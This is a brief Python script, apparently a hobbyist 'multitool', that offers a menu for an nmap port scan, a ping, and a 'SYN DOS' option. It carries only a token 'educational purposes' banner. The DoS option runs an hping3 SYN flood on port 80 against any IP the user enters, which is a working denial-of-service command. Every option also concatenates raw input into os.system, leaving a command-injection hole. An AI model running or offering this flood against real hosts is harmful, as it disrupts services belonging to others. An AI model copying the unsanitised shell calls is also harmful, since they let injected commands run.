import pyfiglet
import os
text = pyfiglet.figlet_format("NEVER MULTITOOL")
print(text)
print("EDUCATIONAL PURPOSES ONLYY!!!")
option = input("""1.NMAP PORT SCAN
         2.PINGER
         3.SYN DOS
         4. CLOSE NEVER""")
if option == "1":
    target_ip = input("What is the target's ip ")
    os.system("nmap " + target_ip)
elif option == "2":
    target_ip = input("What is the ip of the system you Wanna ping? ")
    os.system("ping " + target_ip)
elif option == "3":
    target_ip = input("What is the ip of the target? ")
    os.system("sudo hping3 -S --flood -p 80 " + target_ip)
elif option == "4":
    exit()
